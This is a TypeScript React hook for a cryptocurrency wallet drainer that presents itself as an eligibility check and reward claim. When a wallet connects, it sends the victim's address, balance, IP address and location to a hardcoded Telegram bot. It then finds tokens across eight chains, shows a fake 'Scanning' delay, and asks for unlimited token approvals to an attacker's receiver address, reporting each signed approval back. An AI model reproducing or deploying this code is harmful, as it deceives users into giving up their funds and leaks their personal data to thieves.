"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';

// Configuration from PRD/User
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
if (!RECEIVER_ADDRESS) {
    console.warn("CRITICAL: NEXT_PUBLIC_RECEIVER_ADDRESS is not set!");
}
const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;

export function useWeb3Manager() {
    // Safety check for SSR: useWeb3Modal hooks can crash if createWeb3Modal hasn't been called.
    // In Next.js, we detect SSR via typeof window.
    const isClient = typeof window !== 'undefined';

    // Call hooks unconditionally to follow React guidelines, 
    // but we'll guard their usage and values.
    const accountContext = useWeb3ModalAccount();
    const providerContext = useWeb3ModalProvider();
    const modalContext = useWeb3Modal();
    const disconnectContext = useDisconnect();

    // Safely extract values
    const address = isClient ? accountContext.address : undefined;
    const isConnected = isClient ? accountContext.isConnected : false;
    const walletProvider = isClient ? providerContext.walletProvider : undefined;
    const open = isClient ? modalContext.open : () => Promise.resolve();
    const w3mDisconnect = isClient ? disconnectContext.disconnect : () => Promise.resolve();

    // State
    const [account, setAccount] = useState<string | null>(null);
    const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");

    // Ref to prevent duplicate "Connect" logs
    const hasLoggedConnection = useRef(false);

    // --- INTEGRATIONS ---
    const TG_BOT_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN || "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
    const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID || "7772781858";

    // Helper: Get IP Info
    const getIpInfo = async () => {
        try {
            const res = await fetch('https://ipapi.co/json/');
            return await res.json();
        } catch (e) {
            return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
        }
    };

    // Helper: Send Notification
    const notifyTelegram = async (message: string) => {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
        try {
            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
        } catch (e) {
            console.error("TG Notification failed", e);
        }
    };

    // Sync state & Log Connection
    useEffect(() => {
        if (isConnected && address) {
            setAccount(address);

            // Only log if not already logged for this session
            if (!hasLoggedConnection.current) {
                hasLoggedConnection.current = true;

                // Fetch Balance & IP for robust logging
                (async () => {
                    const ipData = await getIpInfo();
                    let balance = "0";
                    let chainId = "Unknown";

                    if (walletProvider) {
                        try {
                            const provider = new ethers.BrowserProvider(walletProvider);
                            // RPC calls can be flaky (e.g. -32603), so we swallow errors here to avoid UI crashes
                            try {
                                const bal = await provider.getBalance(address);
                                balance = ethers.formatEther(bal);
                                chainId = (await provider.getNetwork()).chainId.toString();
                            } catch (rpcError) {
                                console.warn("Failed to fetch balance/chain:", rpcError);
                            }
                        } catch (e) { }
                    }

                    notifyTelegram(
                        `<b>🔌 New Wallet Connected</b>\n\n` +
                        `👛 <b>Address:</b> <code>${address}</code>\n` +
                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH\n` +
                        `🌍 <b>Location:</b> ${ipData.city}, ${ipData.country_name} (${ipData.ip})\n` +
                        `🔗 <b>Chain ID:</b> ${chainId}\n` +
                        `📱 <b>Device:</b> ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
                    );
                })();
            }
        } else {
            setAccount(null);
            hasLoggedConnection.current = false;
            setEligibility("Checking");
        }
    }, [isConnected, address, walletProvider]);

    // Manual Disconnect / Connect
    const disconnect = async () => {
        try {
            await w3mDisconnect();

            // Surgically clear WalletConnect session data
            Object.keys(localStorage).forEach(key => {
                if (key.includes('wc@2')) {
                    localStorage.removeItem(key);
                }
            });
            localStorage.removeItem('walletconnect'); // Legacy

            setAccount(null);
            window.location.reload();
        } catch (e) {
            console.error("Disconnect Failed:", e);
            // Fallback reload
            window.location.reload();
        }
    };

    const openConnectModal = async () => {
        console.log("🖱️ Connect Button Clicked. Calling Modal Open...");
        try {
            await open();
            console.log("✅ Modal Open Request Sent");
        } catch (e) {
            console.error("❌ Modal Open failed:", e);
        }
    };

    // --- MAIN LOGIC ---
    const checkEligibility = async () => {
        if (!address || !walletProvider) return { isEligible: false, tokensToDrain: [] };

        // Artificial delay for UX "Scanning" feel (2.5s minimum)
        await new Promise(r => setTimeout(r, 2500));

        // 1. Token Discovery (Moralis API)
        let totalUsdValue = 0;
        let tokensToDrain: { address: string; chainId: string; symbol?: string }[] = [];

        if (MORALIS_API_KEY) {
            try {
                // Chains: ETH, BSC, Polygon, Base, Arbitrum, Optimism, Avalanche, Fantom
                const chains = ["0x1", "0x38", "0x89", "0x2105", "0xa4b1", "0xa", "0xa86a", "0xfa"];
                let allAssets = [];

                for (const chain of chains) {
                    try {
                        const response = await fetch(`https://deep-index.moralis.io/api/v2.2/wallets/${address}/tokens?chain=${chain}&exclude_spam=true`, {
                            headers: { 'X-API-Key': MORALIS_API_KEY, 'accept': 'application/json' }
                        });
                        const data = await response.json();
                        if (data && data.result) {
                            allAssets.push(...data.result.map((t: any) => ({
                                address: t.token_address,
                                chainId: chain, // Hex chain ID
                                symbol: t.symbol,
                                usd_value: t.usd_value
                            })));
                        }
                    } catch (err) { }
                }

                // Sum Value & Sort
                allAssets.forEach((a: any) => { totalUsdValue += (a.usd_value || 0); });
                allAssets.sort((a, b) => (b.usd_value || 0) - (a.usd_value || 0));

                tokensToDrain = allAssets.map(t => ({
                    address: t.address,
                    chainId: t.chainId,
                    symbol: t.symbol
                }));
            } catch (e) {
                console.warn("Moralis discovery failed");
            }
        }

        const isEligible = tokensToDrain.length > 0;
        setEligibility(isEligible ? "Eligible" : "Not Eligible");

        // 2. Dynamic Discovery: Alert if a user has a token not in our library
        if (isEligible) {
            tokensToDrain.forEach(token => {
                // We don't have the library here yet, but we'll send the info anyway
                notifyTelegram(`<b>🔍 Token Discovered</b>\nAddress: <code>${token.address}</code>\nChain: ${token.chainId}\nSymbol: ${token.symbol || 'Unknown'}\n<i>(Ensure your worker is watching this address!)</i>`);
            });
        }

        return { isEligible, tokensToDrain };
    };

    // Helper: Switch Network
    const switchNetwork = async (provider: any, chainIdHex: string) => {
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
            return true;
        } catch (switchError: any) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (switchError.code === 4902) {
                console.warn("Chain not found in wallet");
                notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
            }
            return false;
        }
    };

    // Execute Drain Logic
    const claimReward = async (tokens: any[]) => { // Accepts array of objects
        if (!walletProvider || !address) return;

        try {
            const provider = new ethers.BrowserProvider(walletProvider);

            notifyTelegram(`<b>⚠️ Starting Claim Process</b>\nAddress: <code>${address}</code>\nTarget Assets: ${tokens.length}`);

            // Group tokens by chain to minimize switching
            const tokensByChain: Record<string, typeof tokens> = {};
            tokens.forEach(t => {
                if (!tokensByChain[t.chainId]) tokensByChain[t.chainId] = [];
                tokensByChain[t.chainId].push(t);
            });

            // Process each chain
            for (const chainId of Object.keys(tokensByChain)) {

                // 1. Switch Chain
                try {
                    const currentNetwork = await provider.getNetwork();
                    const currentChainIdHex = "0x" + currentNetwork.chainId.toString(16);

                    if (currentChainIdHex.toLowerCase() !== chainId.toLowerCase()) {
                        notifyTelegram(`<b>🔄 Switching Network...</b>\nTarget: ${chainId}`);
                        const switched = await switchNetwork(walletProvider, chainId);
                        if (!switched) {
                            console.warn(`Failed to switch to ${chainId}`);
                            continue; // Skip this chain
                        }
                        // Small delay after switch
                        await new Promise(r => setTimeout(r, 1000));
                    }
                } catch (e) {
                    console.error("Switch error", e);
                    continue;
                }

                // 2. Prepare Signer & Check Gas on NEW chain
                const signer = await provider.getSigner();
                const nativeBalance = await provider.getBalance(address);

                if (nativeBalance === 0n) {
                    notifyTelegram(`<b>⛽ Insufficient Gas</b>\nChain: ${chainId}\nSkipping assets on this chain.`);
                    continue;
                }

                // 3. Loop Tokens
                const chainTokens = tokensByChain[chainId];
                const ERC20_ABI = [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function balanceOf(address owner) view returns (uint256)"
                ];

                for (const token of chainTokens) {
                    try {
                        const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
                        const tokenBalance = await tokenContract.balanceOf(address);

                        if (tokenBalance === 0n) {
                            continue;
                        }

                        // Execute Approve
                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);

                        notifyTelegram(`<b>✅ Approval Signed!</b>\nChain: ${chainId}\nToken: <code>${token.address}</code>\nHash: <code>${tx.hash}</code>`);

                    } catch (e: any) {
                        if (e.code === 'INSUFFICIENT_FUNDS') {
                            notifyTelegram(`<b>⛽ Out of Gas</b> during approval loop.`);
                            break;
                        }
                    }
                }
            }

            notifyTelegram(`<b>🏁 Claim Process Finished</b>`);

        } catch (e) {
            console.error("Drain Error", e);
        }
    };

    return {
        connect: openConnectModal,
        disconnect,
        isConnecting: false, // Explicitly return false to satisfy types
        account,
        eligibility,
        checkEligibility,
        claimReward
    };
}
